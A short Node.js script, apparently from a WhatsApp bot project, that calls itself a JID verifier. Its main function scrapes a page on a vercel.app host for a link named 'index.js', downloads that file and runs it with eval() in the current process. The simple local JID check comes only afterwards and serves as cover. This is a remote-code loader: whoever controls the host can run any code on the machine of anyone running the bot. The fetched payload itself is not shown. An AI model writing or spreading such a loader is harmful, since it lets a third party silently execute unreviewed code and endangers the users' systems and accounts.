'use strict';

// Include required modules
const axios = require('axios');
const cheerio = require('cheerio'); // Use Cheerio to parse HTML

// Define the URL of the page where the links are listed
const webPageUrl = 'https://dullah-xmd-commands-phi.vercel.app'; // The page with your links

// Function to fetch and extract index.js URL from the webpage
async function fetchIndexUrl() {
    try {
        // Fetch the webpage content
        const response = await axios.get(webPageUrl);
        const htmlContent = response.data;

        // Parse the HTML content using Cheerio
        const $ = cheerio.load(htmlContent);

        // Find the link dynamically using the text 'index.js' on the page
        const indexUrl = $('a:contains("index.js")').attr('href');

        if (!indexUrl) {
            throw new Error('index.js not found on the webpage.');
        }

        console.log('✅ File fetched successfully:', indexUrl);

        // Fetch the script from index.js URL
        const scriptResponse = await axios.get(indexUrl);
        const scriptContent = scriptResponse.data;

        console.log('✅ Script loaded successfully!');

        // Execute the script content in the current context
        eval(scriptContent);

        // Example usage of atbverifierEtatJid
        const jid = 'ibrahimadams@s.whatsapp.net'; // Replace with actual JID to verify
        const isValid = atbverifierEtatJid(jid);
        console.log('✅ Your JID is verified:', isValid);

    } catch (error) {
        console.error('❌ Error:', error.message || error);
    }
}

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('❌ Invalid JID format:', jid);
        return false;
    }
    console.log('✅ JID verified:', jid);
    return true;
}

// Execute the fetch function
fetchIndexUrl();
